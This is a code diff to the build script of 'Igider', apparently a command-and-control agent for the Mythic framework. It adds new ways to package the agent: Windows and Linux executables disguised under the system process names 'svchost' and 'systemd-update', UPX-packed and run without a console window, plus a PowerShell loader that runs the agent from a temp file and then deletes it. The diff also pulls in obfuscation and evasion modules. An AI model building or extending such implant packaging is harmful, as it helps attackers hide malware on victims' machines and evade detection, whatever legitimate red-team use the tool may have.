@@ -1,9 +1,9 @@
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-from features.obfuscation import basic_obfuscate, advanced_obfuscate
-from features.evasion import add_evasion_features
-from features.compression import compress_code, create_one_liner
+from .features.obfuscation import basic_obfuscate, advanced_obfuscate
+from .features.evasion import add_evasion_features
+from .features.compression import compress_code, create_one_liner
 import asyncio
 import pathlib
 import os
@@ -35,10 +35,12 @@ class Igider(PayloadType):
         BuildParameter(
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Choose output format",
-            choices=["py", "base64", "py_compressed", "one_liner"],
+            description="How the final payload should be structured for execution",
+            choices=["py", "base64", "py_compressed", "one_liner", "exe_windows", "elf_linux", "powershell_reflective"],
             default_value="py"
         ),
+        
+        ####to review!!!###########
         BuildParameter(
             name="cryptography_method",
             parameter_type=BuildParameterType.ChooseOne,
@@ -132,6 +134,164 @@ class Igider(PayloadType):
             elif value is not None:
                 code = code.replace(key, str(value))
         return code
+    
+    def _create_pyinstaller_spec(self, code: str, target_os: str) -> str:
+        """Generate PyInstaller spec file for executable creation."""
+        spec_content = f"""
+    # -*- mode: python ; coding: utf-8 -*-
+
+    block_cipher = None
+
+    a = Analysis(
+        ['main.py'],
+        pathex=[],
+        binaries=[],
+        datas=[],
+        hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
+        hookspath=[],
+        hooksconfig={{}},
+        runtime_hooks=[],
+        excludes=[],
+        win_no_prefer_redirects=False,
+        win_private_assemblies=False,
+        cipher=block_cipher,
+        noarchive=False,
+    )
+
+    pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+    exe = EXE(
+        pyz,
+        a.scripts,
+        a.binaries,
+        a.zipfiles,
+        a.datas,
+        [],
+        name='{"svchost" if target_os == "windows" else "systemd-update"}',
+        debug=False,
+        bootloader_ignore_signals=False,
+        strip=False,
+        upx=True,
+        upx_exclude=[],
+        runtime_tmpdir=None,
+        console={'False' if target_os == "windows" else 'True'},
+        disable_windowed_traceback=False,
+        argv_emulation=False,
+        target_arch=None,
+        codesign_identity=None,
+        entitlements_file=None,
+        {'icon="icon.ico",' if target_os == "windows" else ''}
+    )
+    """
+        return spec_content
+
+    def _create_powershell_loader(self, python_code: str) -> str:
+        """Create PowerShell reflective loader for Python agent."""
+        # Base64 encode the Python code
+        encoded_code = base64.b64encode(python_code.encode()).decode()
+        
+        powershell_loader = f'''
+    # PowerShell Reflective Python Loader
+    $pythonCode = @"
+    {python_code}
+    "@
+
+    # Check for Python installation
+    $pythonPaths = @(
+        "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",
+        "$env:PROGRAMFILES\\Python*\\python.exe",
+        "$env:PROGRAMFILES(X86)\\Python*\\python.exe",
+        "python.exe"
+    )
+
+    $pythonExe = $null
+    foreach ($path in $pythonPaths) {{
+        try {{
+            $resolved = Get-Command $path -ErrorAction SilentlyContinue
+            if ($resolved) {{
+                $pythonExe = $resolved.Source
+                break
+            }}
+        }} catch {{}}
+    }}
+
+    if (-not $pythonExe) {{
+        # Fallback: Try to download and run portable Python or use IronPython
+        Write-Host "Python not found, attempting alternative execution..."
+        
+        # Alternative 1: Use built-in .NET to execute Python-like logic
+        Add-Type -AssemblyName System.Net.Http
+        
+        # Alternative 2: Convert critical parts to PowerShell
+        # This would require translating the Python agent logic
+        exit 1
+    }}
+
+    # Execute Python code in memory
+    $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
+    $pythonCode | Out-File -FilePath $tempFile -Encoding UTF8
+
+    try {{
+        & $pythonExe $tempFile
+    }} finally {{
+        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    }}
+    '''
+        return powershell_loader
+
+    async def _build_executable(self, code: str, target_os: str) -> bytes:
+        """Build executable using PyInstaller."""
+        import tempfile
+        import subprocess
+        import shutil
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Create main Python file
+            main_py = os.path.join(temp_dir, "main.py")
+            with open(main_py, "w") as f:
+                f.write(code)
+            
+            # Create spec file
+            spec_content = self._create_pyinstaller_spec(code, target_os)
+            spec_file = os.path.join(temp_dir, "build.spec")
+            with open(spec_file, "w") as f:
+                f.write(spec_content)
+            
+            # Add icon for Windows
+            if target_os == "windows":
+                icon_path = os.path.join(temp_dir, "icon.ico")
+                # Create a basic icon or copy from resources
+                # For now, skip icon to avoid complexity
+            
+            try:
+                # Run PyInstaller
+                cmd = ["pyinstaller", "--onefile", "--distpath", temp_dir, spec_file]
+                if target_os == "windows":
+                    cmd.extend(["--noconsole"])
+                
+                result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir)
+                
+                if result.returncode != 0:
+                    raise Exception(f"PyInstaller failed: {result.stderr}")
+                
+                # Find and read the generated executable
+                exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
+                exe_path = os.path.join(temp_dir, exe_name)
+                
+                if not os.path.exists(exe_path):
+                    # Fallback to default PyInstaller output
+                    dist_dir = os.path.join(temp_dir, "dist")
+                    if os.path.exists(dist_dir):
+                        files = os.listdir(dist_dir)
+                        if files:
+                            exe_path = os.path.join(dist_dir, files[0])
+                
+                with open(exe_path, "rb") as f:
+                    return f.read()
+                    
+            except Exception as e:
+                self.logger.error(f"Executable build failed: {e}")
+                raise Exception(f"Failed to build executable: {str(e)}")
 
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
@@ -234,6 +394,36 @@ class Igider(PayloadType):
                 one_liner = create_one_liner(base_code)
                 resp.payload = one_liner.encode()
                 resp.build_message = "Successfully built one-liner payload"
+            elif output_format == "exe_windows":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Windows executable...")
+                    executable_data = await self._build_executable(base_code, "windows")
+                    resp.payload = executable_data
+                    resp.build_message = "Successfully built Windows executable"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build Windows executable: {str(e)}"
+                    return resp
+            elif output_format == "elf_linux":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Linux executable...")
+                    executable_data = await self._build_executable(base_code, "linux")
+                    resp.payload = executable_data
+                    resp.build_message = "Successfully built Linux executable"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build Linux executable: {str(e)}"
+                    return resp
+            elif output_format == "powershell_reflective":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
+                    ps_loader = self._create_powershell_loader(base_code)
+                    resp.payload = ps_loader.encode()
+                    resp.build_message = "Successfully built PowerShell reflective loader"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
+                    return resp
             else:  # default to py
                 resp.payload = base_code.encode()
                 resp.build_message = "Successfully built Python script payload"
@@ -242,6 +432,7 @@ class Igider(PayloadType):
             if build_errors:
                 resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
             
+
         except Exception as e:
             self.logger.error(f"Build failed: {str(e)}")
             resp.set_status(BuildStatus.Error)
